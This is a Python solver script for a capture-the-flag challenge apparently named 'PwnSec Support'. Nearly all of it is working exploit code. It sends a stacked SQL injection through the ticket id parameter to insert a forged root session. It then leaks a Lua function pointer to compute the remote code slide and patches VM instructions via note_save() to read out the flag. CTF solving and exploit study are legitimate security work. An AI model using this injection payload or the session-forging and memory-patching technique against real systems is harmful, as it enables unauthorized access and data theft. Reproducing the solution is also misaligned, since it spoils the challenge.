#!/usr/bin/env python3
"""Local/remote solver for PwnSec Support.

The exploit has two stages:
  1. stacked SQL injection in /ticket creates a root session;
  2. note_save() patches embedded_ticks() so ticks() pushes FLAG as a string.

The VM's relative addresses are derived from the supplied .l3af image instead
of being hard-coded.  A Lua function-pointer disclosure supplies the remote
code slide, which can differ because the remote FLAGPAD is a different size.
"""

from __future__ import annotations

import argparse
import html
import json
import re
import secrets
import sys
from pathlib import Path

import requests


DATA_DIRECTIVES = {"DATA", "DATA_BYTES", "DATA_RELOC"}
LC_OPCODE = 1


def align(value: int, boundary: int) -> int:
    return (value + boundary - 1) & -boundary


def derive_addresses(image: Path) -> dict[str, int]:
    data_pc = 0x10000
    data_symbols: dict[str, int] = {}

    # DATA_BYTES can contain several megabytes of hex and is irrelevant to
    # address calculation, so avoid decoding those JSON lines.
    with image.open("r", encoding="utf-8") as src:
        for line in src:
            stripped = line.lstrip()
            if not stripped.strip():
                continue
            if stripped.startswith('["DATA_BYTES"') or stripped.startswith('["DATA_RELOC"'):
                continue
            obj = json.loads(line)
            if isinstance(obj, list) and obj and obj[0] == "DATA":
                data_pc = align(data_pc, 4)
                data_symbols[obj[1]] = data_pc
                data_pc += int(obj[2])

    code_start = align(data_pc, 16)
    # The loader adds CALL :main and HLT before the file's first instruction.
    code_pc = code_start + 2 * 16
    code_symbols: dict[str, int] = {}
    instructions: list[tuple[int, list[object]]] = []

    with image.open("r", encoding="utf-8") as src:
        for line in src:
            stripped = line.lstrip()
            if not stripped.strip():
                continue
            if stripped.startswith('["DATA_BYTES"') or stripped.startswith('["DATA_RELOC"'):
                continue
            obj = json.loads(line)
            if isinstance(obj, str):
                code_symbols[obj] = code_pc
            elif isinstance(obj, list) and obj and obj[0] not in DATA_DIRECTIVES:
                instructions.append((code_pc, obj))
                code_pc += 16

    try:
        ticks_start = code_symbols[":embedded_ticks"]
        pushstring = code_symbols[":lua_pushstring"]
        flag = data_symbols["FLAG"]
    except KeyError as exc:
        raise RuntimeError(f"required symbol missing from image: {exc}") from exc

    window = [(pc, ins) for pc, ins in instructions if ticks_start <= pc < ticks_start + 0x200]
    call_ticks = next(pc for pc, ins in window if ins[:2] == ["CALL", ":ticks"])
    call_pushinteger = next(
        pc for pc, ins in window if ins[:2] == ["CALL", ":lua_pushinteger"]
    )

    return {
        "flag": flag,
        "code_start": code_start,
        "embedded_ticks": ticks_start,
        "call_ticks": call_ticks,
        "call_pushinteger": call_pushinteger,
        "lua_pushstring": pushstring,
    }


def exploit(base_url: str, image: Path, timeout: float) -> str:
    addrs = derive_addresses(image)
    token = "pwn_" + secrets.token_hex(8)
    base_url = base_url.rstrip("/")

    session = requests.Session()
    session.trust_env = False

    # The ticket id is concatenated directly into a query, and the custom SQL
    # parser accepts multiple semicolon-separated statements.
    sqli = (
        "1; INSERT INTO sessions (token, user_id, expires_at, ip_address) "
        f"VALUES ('{token}', 1, '2099-01-01', '127.0.0.1')"
    )
    response = session.get(
        base_url + "/ticket", params={"id": sqli}, timeout=timeout
    )
    response.raise_for_status()

    # tostring() on an embedded C function discloses its VM code address.
    # Comparing it with the handout address gives the remote code slide.
    response = session.post(
        base_url + "/admin",
        data={"token": token, "code": "print(tostring(ticks))"},
        timeout=timeout,
    )
    response.raise_for_status()
    pointer_match = re.search(r"function:\s*(?:0x)?([0-9a-fA-F]+)", response.text)
    if not pointer_match:
        raise RuntimeError("could not disclose the remote ticks() address")
    remote_ticks = int(pointer_match.group(1), 16)
    code_slide = remote_ticks - addrs["embedded_ticks"]

    # Every VM instruction is four little-endian 32-bit words:
    #   opcode, operand A, operand B, operand C
    # Turn `CALL :ticks` into `LC R0, FLAG`, then redirect the later
    # lua_pushinteger call to lua_pushstring.  FLAG is the final DATA object,
    # immediately before the code segment.  Scan that small region by changing
    # LC's pointer until ticks() returns a string containing the flag prefix.
    call_ticks = addrs["call_ticks"] + code_slide
    call_pushinteger = addrs["call_pushinteger"] + code_slide
    lua_pushstring = addrs["lua_pushstring"] + code_slide
    code_start = addrs["code_start"] + code_slide
    code = "\n".join(
        [
            f"note_save({call_ticks}, {LC_OPCODE})",
            f"note_save({call_ticks + 4}, 0)",
            f"note_save({call_pushinteger + 4}, {lua_pushstring})",
            f"for a={code_start - 1},{code_start - 512},-1 do",
            f" note_save({call_ticks + 8},a)",
            " local s=ticks()",
            " if string.find(string.lower(s),'pwnsec{',1,true) then print(s); break end",
            "end",
        ]
    )
    response = session.post(
        base_url + "/admin",
        data={"token": token, "code": code},
        timeout=timeout,
    )
    response.raise_for_status()

    outputs = re.findall(r'<pre class="out">(.*?)</pre>', response.text, re.DOTALL)
    rendered = "\n".join(html.unescape(output) for output in outputs)
    match = re.search(r"[A-Za-z0-9_]+\{[^}\r\n]+\}", rendered)
    if not match:
        raise RuntimeError("exploit ran, but no flag was found in the console output: " + rendered)
    return match.group(0)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "url",
        nargs="?",
        default="http://127.0.0.1:8081",
        help="challenge base URL (default: %(default)s)",
    )
    parser.add_argument(
        "--image",
        type=Path,
        default=Path(__file__).with_name("ctf_sql.l3af"),
        help="supplied .l3af image used to derive addresses",
    )
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    try:
        flag = exploit(args.url, args.image, args.timeout)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1
    print(f"[+] {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
